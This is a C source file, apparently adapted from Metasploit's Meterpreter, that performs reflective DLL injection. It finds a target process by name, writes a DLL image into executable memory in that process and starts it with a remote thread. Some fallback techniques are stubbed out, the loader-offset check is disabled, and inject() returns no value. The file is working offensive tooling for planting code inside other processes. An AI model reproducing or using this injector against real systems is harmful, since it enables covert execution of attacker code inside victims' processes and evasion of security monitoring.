#include "metsrv.h"
#include "base_inject.h"
#include "remote_thread.h"
// #include "../../ReflectiveDLLInjection/inject/src/LoadLibraryR.h"
#include <tlhelp32.h>

DWORD inject_via_apcthread(Remote *remote, Packet *response, HANDLE hProcess, DWORD dwProcessID, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter)
{
	dprintf("[INJECT] not supported!");
	return ERROR_ACCESS_DENIED;
}

DWORD inject_via_remotethread_nop(Remote *remote, Packet *response, HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter)
{
	dprintf("[INJECT] not supported!");
	return ERROR_ACCESS_DENIED;
}

DWORD inject_via_remotethread_wow64(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE *pThread)
{
	dprintf("[INJECT] not supported!");
	return ERROR_ACCESS_DENIED;
}

DWORD inject_dll_nop(DWORD dwPid, LPVOID lpDllBuffer, DWORD dwDllLength, LPCSTR reflectiveLoader, char *cpCommandLine)
{
	dprintf("[INJECT] not supported!");
	return ERROR_ACCESS_DENIED;
}

/*
 * Attempte to gain code execution in the remote process by creating a remote thread in the target process.
 */
DWORD inject_via_remotethread(Remote *remote, Packet *response, HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter)
{
	DWORD dwResult = ERROR_SUCCESS;
	DWORD dwTechnique = MIGRATE_TECHNIQUE_REMOTETHREAD;
	HANDLE hThread = NULL;

	do
	{
		// Create the thread in the remote process. Create suspended in case the call to CreateRemoteThread
		// fails, giving us a chance to try an alternative method or fail migration gracefully.
		hThread = create_remote_thread(hProcess, 1024 * 1024, lpStartAddress, lpParameter, CREATE_SUSPENDED, NULL);
		if (!hThread)
		{
			if (dwMeterpreterArch == PROCESS_ARCH_X86 && dwDestinationArch == PROCESS_ARCH_X64)
			{
				dwTechnique = MIGRATE_TECHNIQUE_REMOTETHREADWOW64;

				if (inject_via_remotethread_wow64(hProcess, lpStartAddress, lpParameter, &hThread) != ERROR_SUCCESS)
				{
					BREAK_ON_ERROR("[INJECT] inject_via_remotethread: migrate_via_remotethread_wow64 failed")
				}
			}
			else
			{
				BREAK_ON_ERROR("[INJECT] inject_via_remotethread: CreateRemoteThread failed")
			}
		}
		else
		{
			dprintf("[INJECT] inject_via_remotethread: succeeded");
		}

		if (remote && response)
		{
			dprintf("[INJECT] inject_via_remotethread: Sending a migrate response...");
			// Send a successful response to let the ruby side know that we've pretty
			// much successfully migrated and have reached the point of no return
			packet_add_tlv_uint(response, TLV_TYPE_MIGRATE_TECHNIQUE, dwTechnique);
			packet_transmit_response(ERROR_SUCCESS, remote, response);

			dprintf("[INJECT] inject_via_remotethread: Sleeping for two seconds...");
			// Sleep to give the remote side a chance to catch up...
			Sleep(2000);
		}

		dprintf("[INJECT] inject_via_remotethread: Resuming the injected thread...");
		// Resume the injected thread...
		if (ResumeThread(hThread) == (DWORD)-1)
		{
			BREAK_ON_ERROR("[INJECT] inject_via_remotethread: ResumeThread failed")
		}

	} while (0);

	if (hThread)
	{
		CloseHandle(hThread);
	}

	SetLastError(dwResult);

	return dwResult;
}

#include <tlhelp32.h>

// find process ID by process name
int find_pid(const wchar_t *procname)
{
	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;

	// snapshot of all processes in the system
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot)
		return 0;

	// initializing size: needed for using Process32First
	pe.dwSize = sizeof(PROCESSENTRY32);

	// info about first process encountered in a system snapshot
	hResult = Process32First(hSnapshot, &pe);

	// retrieve information about the processes
	// and exit if unsuccessful
	while (hResult)
	{
		// if we find the process: return process ID
		if (wcscmp(procname, pe.szExeFile) == 0)
		{
			pid = pe.th32ProcessID;
			break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}

	// closes an open handle (CreateToolhelp32Snapshot)
	CloseHandle(hSnapshot);
	return pid;
}
/*
 * Inject a DLL image into a process via Reflective DLL Injection.
 *
 * Note: You must inject a DLL of the correct target process architecture, (e.g. a PE32 DLL for
 *       an x86 (wow64) process or a PE64 DLL for an x64 process). The wrapper function ps_inject_dll()
 *       in stdapi will handle this automatically.
 *
 * Note: GetReflectiveLoaderOffset() has a limitation of currenlty not being able to work for PE32 DLL's
 *       in a native x64 meterpereter due to compile time assumptions, however GetReflectiveLoaderOffset()
 *       will check for this and fail gracefully.
 *
 * Note: This function largely depreciates LoadRemoteLibraryR().
 */

DWORD inject_dll(DWORD dwPid, LPVOID lpDllBuffer, DWORD dwDllLength, LPCSTR reflectiveLoader, char *cpCommandLine)
{
	DWORD dwResult = ERROR_ACCESS_DENIED;
	DWORD dwNativeArch = PROCESS_ARCH_UNKNOWN;
	LPVOID lpRemoteCommandLine = NULL;
	HANDLE hProcess = NULL;
	LPVOID lpRemoteLibraryBuffer = NULL;
	LPVOID lpReflectiveLoader = NULL;
	DWORD dwReflectiveLoaderOffset = 0;

	do
	{
		if (!lpDllBuffer || !dwDllLength)
			BREAK_WITH_ERROR("[INJECT] inject_dll.  No Dll buffer supplied.", ERROR_INVALID_PARAMETER);

		// check if the library has a ReflectiveLoader...
		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpDllBuffer, reflectiveLoader);

#if 1 // skip check now
		if (FALSE && !dwReflectiveLoaderOffset)
			BREAK_WITH_ERROR("[INJECT] inject_dll. GetReflectiveLoaderOffset failed.", ERROR_INVALID_FUNCTION);
#endif
		hProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPid);
		if (!hProcess)
			BREAK_ON_ERROR("[INJECT] inject_dll. OpenProcess failed.");

		if (cpCommandLine)
		{
			// alloc some space and write the commandline which we will pass to the injected dll...
			lpRemoteCommandLine = VirtualAllocEx(hProcess, NULL, strlen(cpCommandLine) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
			if (!lpRemoteCommandLine)
				BREAK_ON_ERROR("[INJECT] inject_dll. VirtualAllocEx 1 failed");

			if (!WriteProcessMemory(hProcess, lpRemoteCommandLine, cpCommandLine, strlen(cpCommandLine) + 1, NULL))
				BREAK_ON_ERROR("[INJECT] inject_dll. WriteProcessMemory 1 failed");
		}

		// alloc memory (RWX) in the host process for the image...
		lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwDllLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!lpRemoteLibraryBuffer)
			BREAK_ON_ERROR("[INJECT] inject_dll. VirtualAllocEx 2 failed");

		// write the image into the host process...
		if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpDllBuffer, dwDllLength, NULL))
			BREAK_ON_ERROR("[INJECT] inject_dll. WriteProcessMemory 2 failed");

		// add the offset to ReflectiveLoader() to the remote library address...
		lpReflectiveLoader = (LPVOID)((DWORD_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);

		// First we try to inject by directly creating a remote thread in the target process
		if (inject_via_remotethread(NULL, NULL, hProcess, dwMeterpreterArch, lpReflectiveLoader, lpRemoteCommandLine) != ERROR_SUCCESS)
		{
			dprintf("[INJECT] inject_dll. inject_via_remotethread failed, trying inject_via_apcthread...");

			// If that fails we can try to migrate via a queued APC in the target process
			if (inject_via_apcthread(NULL, NULL, hProcess, dwPid, dwMeterpreterArch, lpReflectiveLoader, lpRemoteCommandLine) != ERROR_SUCCESS)
				BREAK_ON_ERROR("[INJECT] inject_dll. inject_via_apcthread failed")
		}

		dwResult = ERROR_SUCCESS;

	} while (0);

	if (hProcess)
		CloseHandle(hProcess);

	return dwResult;
}

DWORD inject(const wchar_t *procname, LPVOID lpDllBuffer, DWORD dwDllLength)
{
	LPSTR reflectiveLoaderName = ((LPSTR)((ULONG_PTR)((WORD)(1))));
	int pid = find_pid(procname);

	inject_dll(pid, lpDllBuffer, dwDllLength, reflectiveLoaderName, NULL);
}